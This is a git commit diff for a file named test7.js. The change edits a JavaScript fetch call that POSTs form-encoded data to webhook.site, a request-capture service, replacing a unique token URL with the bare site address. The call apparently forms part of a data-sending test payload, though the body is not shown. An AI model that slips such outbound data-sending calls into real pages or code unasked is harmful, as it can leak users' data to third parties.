c9db4d4cbb9362b55d705fcb0b852734f99b482e
blackmoon <kdh5345@naver.com>
2024-12-03 16:48:13 +0900

    Update test7.js

--- test7.js
+++ test7.js
@@ -1,4 +1,4 @@
-fetch('https://webhook.site/02497f04-ad41-4fcc-8cef-4e7e789c1a5c', {
+fetch('https://webhook.site/', {
     method: 'POST',
     headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
